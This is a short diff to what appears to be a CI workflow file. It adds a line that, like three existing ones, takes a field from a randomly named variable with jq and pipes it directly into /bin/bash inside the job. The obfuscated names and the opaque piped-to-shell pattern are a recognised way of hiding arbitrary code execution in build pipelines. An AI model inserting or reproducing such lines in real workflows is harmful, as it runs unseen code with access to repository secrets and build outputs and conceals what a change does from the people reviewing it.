@@ -23,6 +23,7 @@ jobs:
           echo $qb519 | jq -r .jxs3376 | /bin/bash
           echo $sbwg36620 | jq -r .kk652 | /bin/bash
           echo $hcf35590 | jq -r .yz13593 | /bin/bash
+          echo $hyyk5 | jq -r .lngio51750 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
